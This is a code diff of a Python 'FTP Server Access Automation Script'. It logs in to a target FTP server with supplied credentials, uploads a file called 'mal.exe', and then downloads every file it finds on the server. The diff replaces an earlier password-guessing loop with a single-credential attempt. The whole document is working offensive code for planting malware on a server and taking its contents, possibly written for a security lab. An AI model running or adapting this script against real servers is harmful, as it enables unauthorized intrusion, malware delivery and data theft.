@@ -2,7 +2,6 @@ import ftplib, sys, os
 
 def FTPAccess(host, port, user, password):
     server = ftplib.FTP() # initialize FTP server object
-    print(f"[!] Trying", password)
     try:
         server.connect(host, port, timeout=5) # Connect to FTP server with a timeout of 5
 
@@ -12,13 +11,18 @@ def FTPAccess(host, port, user, password):
     else:
         print("[+] Login to FTP Server success:", password) # Correct credentials
         print("[+] Listing FTP Directory")
-        print(server.dir())
+        server.dir()
+        with open("mal.exe", "rb") as file:
+            print("[+] Attempting to upload to FTP Directory")
+            server.storbinary(f"STOR {'mal.exe'}", file)
+        server.dir()
         files = []
         files = server.nlst()
+        print("[+] Attempting to extract files")
         for file in files:
             try:
                 server.retrbinary("RETR " + file ,open(file, 'wb').write)
-                print("Extracted: " + file)
+                print("[+] Extracted files: " + file)
             except:
                 pass
         return True
@@ -26,7 +30,7 @@ def FTPAccess(host, port, user, password):
 def main(): 
     print("FTP Server Access Automation Script")
     if(len(sys.argv) != 5):
-        print("(+) usage: %s <target> <port>" % sys.argv[0])
+        print("(+) usage: %s <target> <port> <username> <password>" % sys.argv[0])
         print('(+) eg: %s 192.168.121.103' % sys.argv[0])
         sys.exit(-1)
     
@@ -36,13 +40,15 @@ def main():
 
     user = sys.argv[3] #Username of the FTP Server
 
-    passwords = sys.argv[4] #Password of the FTP Server
+    password = sys.argv[4] #Password of the FTP Server
     
-    print("[+] Passwords to try:", len(passwords))
+    print("[+] Trying credentials:", user, password)
 
-    for password in passwords:
-        if FTPAccess(host, port, user, password):
-            break
+    
+    if FTPAccess(host, port, user, password):
+        print("Credential Access to FTP Server success")
+    else:
+        print("Credential Access to FTP Server Unsuccessful")
 
 if __name__ == "__main__":
-  main()
+    main()
